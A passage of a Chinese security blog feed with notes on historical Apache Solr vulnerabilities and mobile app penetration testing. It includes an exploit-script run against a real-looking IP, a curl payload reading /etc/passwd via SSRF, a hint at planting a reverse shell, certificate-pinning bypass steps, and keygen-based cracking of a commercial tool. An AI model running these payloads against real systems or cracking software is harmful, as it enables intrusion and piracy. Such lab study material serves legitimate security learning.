&lt;p&gt;Apache Solr 是一个开源的搜索服务，使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现的。Solr 是一个高性能，采用 Java5 开发，基于 Lucene 的全文搜索服务器。&lt;/p&gt;
&lt;p&gt;漏洞判断：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hdmQuYWxpeXVuLmNvbS9zZWFyY2g/cT1zb2xy&#34;&gt;https://avd.aliyun.com/search?q=solr&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;apache solr的历史漏洞如下，作简单了解：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;远程命令执行RCE（CVE-2017-12629 ）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;远程命令执行XXE（CVE-2017-12629 ）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;任意文件读取AND命令执行（CVE-2019-17558 ）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;远程命令执行漏洞(CVE-2019-0192)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;远程命令执行漏洞(CVE-2019-0193)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;未授权上传漏洞(CVE-2020-13957)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Apache Solr SSRF (CVE-2021-27905)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2017-12629 远程命令执行 RCE&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过 Http 利用 XML 加到一 个搜索集合中。查询该集合也是通过 http 收到一个 XML/JSON 响应来实现。此 次 7.1.0 之前版本总共爆出两个漏洞：XML 实体扩展漏洞 (XXE) 和远程命令执行漏洞 (RCE)，二者可以连接成利用链，编号均为 CVE-2017-12629。&lt;/p&gt;
&lt;p&gt;漏洞复现:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NvbHIvQ1ZFLTIwMTctMTI2MjktUkNFLw==&#34;&gt;https://vulhub.org/#/environments/solr/CVE-2017-12629-RCE/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Apache solr&amp;lt;7.1.0 版本，直接通过 burp 抓包修改数据即可&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2019-17558 Apache Solr Velocity 注入远程命令执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Apache Solr 是一个开源的搜索服务器。在其 5.0.0 到 8.3.1 版本中，用户可以注入自定义模板，通过 Velocity 模板语言执行任意命令。&lt;/p&gt;
&lt;p&gt;漏洞复现:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vc29scl9yY2U=&#34;&gt;https://github.com/jas502n/solr_rce&lt;/span&gt;&lt;br&gt;
 漏洞说明:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvc29sci9DVkUtMjAxOS0xNzU1OC9SRUFETUUuemgtY24ubWQ=&#34;&gt;https://github.com/vulhub/vulhub/blob/master/solr/CVE-2019-17558/README.zh-cn.md&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;D:\Python27\python.exe solr_rce.py http://123.58.236.76:50847 id&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在实战中，当发现有 Solr 资产时，可直接通过脚本测试，没有就是没有&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2019-0193 Apache Solr 远程命令执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基&lt;br&gt;
于 HTTP 和 Apache Lucene 实现。此次漏洞出现在 Apache Solr 的 DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源 中提取数据。它具有一个功能，其中所有的 DIH 配置都可以通过外部请求的 dataConfig 参数来设置。由于 DIH 配置可以包含脚本，因此攻击者可以通过构 造危险的请求，从而造成远程命令执行。&lt;/p&gt;
&lt;p&gt;漏洞复现:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NvbHIvQ1ZFLTIwMTktMDE5My8=&#34;&gt;https://vulhub.org/#/environments/solr/CVE-2019-0193/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;有两个前提条件，一个是有未授权或者弱密码可以进入后台，二是后台里边已经创建过一个模板，如果满足，可以修改再后台用 debug 模式调整 dataConfig 的代码，加入反弹 shell 的命令即可利用&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2021-27905 Apache Solr RemoteStreaming 文件读取与 SSRF 漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Apache Solr 是一个开源的搜索服务器。在 Apache Solr 未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成 SSRF 或任意文件读取。&lt;/p&gt;
&lt;p&gt;漏洞复现: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NvbHIvUmVtb3RlLVN0cmVhbWluZy1GaWxlcmVhZC8=&#34;&gt;https://vulhub.org/#/environments/solr/Remote-Streaming-Fileread/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;最后获取信息的 payload 如下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl-i -s -k&amp;#x27;http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&amp;amp;stream.url=file:///etc/passwd&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;可以调整file协议为其他协议如http，通过访问dnslog来验证漏洞存在&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <category term="渗透测试" />
        <updated>2022-12-29T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2022/12/30/SAFE/5%20APP%E6%94%BB%E9%98%B2/</id>
        <title>XD22 5 APP 攻防</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2022/12/30/SAFE/5%20APP%E6%94%BB%E9%98%B2/"/>
        <content type="html">&lt;h3 id=&#34;app-信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#app-信息收集&#34;&gt;#&lt;/a&gt; APP 信息收集&lt;/h3&gt;
&lt;p&gt;有很多小工具就可以完成部分信息收集，但是信息收集不完整&lt;/p&gt;
&lt;p&gt;APK Messenger - 基本信息、资源文件与开启权限等，可以提取到此 apk 中的&lt;br&gt;
图片资源，xml 资源，其他数据等。&lt;/p&gt;
&lt;h4 id=&#34;appinfoscanner采集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#appinfoscanner采集&#34;&gt;#&lt;/a&gt; AppInfoScanner 采集&lt;/h4&gt;
&lt;p&gt;一款适用于以 HW 行动 / 红队 / 渗透测试团队为场景的移动端 (Android、iOS、 WEB、H5、静态网站) 信息收集扫描工具，可以帮助渗透测试工程师、攻击队 成员、红队成员快速收集到移动端或者静态 WEB 站点中关键的资产信息并提供 基本的信息输出，如：Title、Domain、CDN、指纹信息、状态信息等。&lt;/p&gt;
&lt;p&gt;AppInfoScanner 使用方法：提取是从 apk 自身代码中进行提取的，另外还可以直接通过抓包的方法来提取信息，通过配置模拟器代理，流量监听之 burp 的方法是从访问接口进行提取的，两种方法在实际测试汇总都要使用。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;https://github.com/kelvinBen/AppInfoScanner&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python app.py android -i &amp;lt;Your APK File or DEX File or APK Download Url &amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python app.py ios -i &amp;lt;Your IPA file or Mach-o File or IPA Download Url or Save File Dir&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python app.py web -i &amp;lt;Your Web file or Save Web Dir or Web Cache Url&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;mobsf-移动安全&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mobsf-移动安全&#34;&gt;#&lt;/a&gt; MobSF 移动安全&lt;/h4&gt;
&lt;p&gt;一种自动化的一体化移动应用程序 (Android/iOS/Windows) 渗透测试、恶 意软件分析和安全评估框架，能够执行静态和动态分析。MobSF 支持移动应用 程序二进制文件 (APK、XAPK、IPA 和 APPX) 以及压缩源代码，并提供 REST API 以与您的 CI/CD 或 DevSecOps 管道无缝集成。动态分析器可帮助 您执行运行时安全评估和交互式仪器测试。&lt;/p&gt;
&lt;p&gt;mobsf 使用方法：&lt;br&gt;
在线使用：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tb2JzZi5saXZlLw==&#34;&gt;https://mobsf.live/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;https://github.com/MobSF/Mobile-Security-Framework-MobSF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装及运行MobSF：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker pull opensecurity/mobile-security-framework-mobsf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker run -it -p 8008:8000 opensecurity/mobile-security-framework-mobsf:latest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;（前面的端口是宿主机的端口，后面的端口是docker中容器的端口）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;访问http://110.42.178.227:8008/上传应用程序即可进行软件自动化分析。分析结果比&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;AppInfoScan 要更好一些，资产分析的更加全面一点。&lt;/p&gt;
&lt;h4 id=&#34;mobexler-移动测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mobexler-移动测试&#34;&gt;#&lt;/a&gt; Mobexler 移动测试&lt;/h4&gt;
&lt;p&gt;Mobexler 是基于 Elementary OS 的定制虚拟机，旨在帮助进行 Android 和 iOS 应用程序的渗透测试。Mobexler 预装了各种开源工具，脚本，黑客必备软 件等，这些都是安全测试 Android 和 iOS 应用程序所必需的。集成有大量的安卓测试工具哦。&lt;/p&gt;
&lt;p&gt;官网地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tb2JleGxlci5jb20v&#34;&gt;https://mobexler.com/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;apk-数据包捕获&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#apk-数据包捕获&#34;&gt;#&lt;/a&gt; apk 数据包捕获&lt;/h3&gt;
&lt;p&gt;有些 app 是不能够抓取到数据包的，有两种可能。一是 app 内部进行了反 代理设置，另外一种情况是进行了证书校验。而一般我们在模拟器里边配置的 证书只能解决客户端的单向校验问题，如果是双向校验也不能抓取到数据包。&lt;/p&gt;
&lt;h4 id=&#34;反代理绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反代理绕过&#34;&gt;#&lt;/a&gt; 反代理绕过&lt;/h4&gt;
&lt;p&gt;对于反代理设置，是因为 app 中有代码设置为将当前的数据禁止发往 wifi 的代理，否则显示网络错误，可以通过两种方式来解决，一是通过模拟器自带 的抓包工具来抓包，而不是通过 wif 的代理来转发流量，而是通过 profixier+burp 的方式来绕过此限制。profixier 添加 burp 的端口，并设置规则为 noxhandler 和 nox (可以通过当前正在运行的进程和软件的属性中软件的启动程序来确定)， 此时数据被 proxifer 代理，流量发送至了 burp。&lt;/p&gt;
&lt;h4 id=&#34;证书校验绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#证书校验绕过&#34;&gt;#&lt;/a&gt; 证书校验绕过&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;情况 1: 客户端不存在证书校验，服务器也不存在证书校验。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于无证书校验，只要在 burp 上配置证书就可以了；&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;情况 2: 客户端存在校验服务端证书，服务器也不存在证书校验，单项校验。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于单证书校验，通过 xposed 框架，在模拟器上安装 xposed 并在其内安装新添加的 justTrust 的 apk，来通过工具绕过证书校验，此时再次设置网络代理仍旧可以抓取到数据包；&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;情况 3: 客户端存在证书校验，服务器也存在证书校验，双向校验。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果是双向证书校验，可以通过两种种方式来绕过。首先就是 frida+r0capture 的方式来捕获所有的网络数据包；或是通过反编译 apk 去掉证书校验的代码在重新编译好的 apk 抓包。&lt;/p&gt;
&lt;h4 id=&#34;双向证书校验绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#双向证书校验绕过&#34;&gt;#&lt;/a&gt; 双向证书校验绕过&lt;/h4&gt;
&lt;p&gt;模拟器用代理抓取数据包被禁止的解决方法：r0capture+firda&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;r0capture：安卓应用层抓包通杀脚本 配合 firda 使用&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;https://github.com/r0ysue/r0capture&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Attach 模式，抓包内容保存成pcap文件供后续分析：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 r0capture.py -U com.qiyi.video -v -p iqiyi.pcap&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Firda&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Firda 是一款易用的跨平 Hook 工具， Java 层到 Native 层的 Hook 无所不能，是一种 动态 的插桩工具，可以插入代码到原生 App 的内存空间中，动态的去监视和修改行为，原生平台包括 Win、Mac、Linux、Android、iOS 全平台。&lt;/p&gt;
&lt;p&gt;地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZyaWRhL2ZyaWRhL3JlbGVhc2Vz&#34;&gt;https://github.com/frida/frida/releases&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;测试&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;环境：Windows10 Python3.7 夜神模拟器 r0capture frida-server wireshark&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a. 本地安装Frida&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pip install frida &amp;amp;&amp;amp; pip install frida-tools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b. 模拟器安装Frida，注意版本要与本地Frida一致&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;如果是真机，就一定是ARM版本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看模拟器的是位数是 32 还是 64 ：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getprop ro.product.cpu.abi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;真机与模拟器之间传输文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;adb push frida-server /data/local/frida-server&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在模拟器中运行frida-server&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash /data/local/frida-server&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c. 转发并启动Frida：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;adb forward tcp:27042 tcp:27042&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;连接判断&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frida-ps -U &amp;amp;&amp;amp; frida-ps -R&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取包名（ 或 通过应用软件Apk Messenger）：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls /data/data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过r0capture 抓包&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python r0capture.py -U -f 包名 - p xxxx.pcap&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;脱壳与加壳&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#脱壳与加壳&#34;&gt;#&lt;/a&gt; 脱壳与加壳&lt;/h3&gt;
&lt;p&gt;有的应用为了防止被反编译，在应用程序生成之后还会进行一层加固即加 壳，如果能够设法脱壳是可以进行反编译的否则就没办法得到源代码。查壳工 具 ApkScan-PKID 可以得到当前应用程序是否加壳，是以哪种方式进行加壳的。 另有脱壳工具 BlackDex，直接下载运行即可。&lt;/p&gt;
&lt;p&gt;下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NvZGluZ0dheS9CbGFja0RleCVFMyU4MCU4Mg==&#34;&gt;https://github.com/CodingGay/BlackDex。&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;apk程序反编译&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#apk程序反编译&#34;&gt;#&lt;/a&gt; apk 程序反编译&lt;/h4&gt;
&lt;p&gt;Apkkiller 可以进行反编译，提取到源代码并进行导出，加载到 IDEA 中去识别相应逻辑。如果要修改源代码中的某些功能，需要寻找到对应位置进行修改。&lt;/p&gt;
&lt;p&gt;安卓修改大师是一款集成化的工具，可以反编译，修改图标，搜索源代码， 查看 java/smail 代码，重新签名打包等，比较适合用来检测 apk 的安全。修改软 件功能，如观看次数及是否是会员的操作，一般是搜索源代码中的关键词进行 定位，判断业务逻辑，确定当前数据来源，是否依托于网络数据还是就是在本 地存储的，如果是本地存储的就可以修改。&lt;/p&gt;
&lt;h4 id=&#34;安卓修改大师破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安卓修改大师破解&#34;&gt;#&lt;/a&gt; 安卓修改大师破解&lt;/h4&gt;
&lt;p&gt;下载并安装原程序，先不要运行软件；&lt;/p&gt;
&lt;p&gt;接着把 crack 文件夹里的 “ApkHelper.exe” 拷贝到软件安装目录下替换；【默认路径 C:\Program Files (x86)\ApkEditor】&lt;/p&gt;
&lt;p&gt;再用 crack 文件夹里的注册机进行注册；&lt;/p&gt;
&lt;p&gt;至此就全部破解完成啦，用户可随意使用里面的功能了&lt;/p&gt;
&lt;h3 id=&#34;微信小程序安全&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#微信小程序安全&#34;&gt;#&lt;/a&gt; 微信小程序安全&lt;/h3&gt;
&lt;h4 id=&#34;微信小程序抓包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#微信小程序抓包&#34;&gt;#&lt;/a&gt; 微信小程序抓包&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;安卓系统抓包（微信小程序）：&lt;/li&gt;
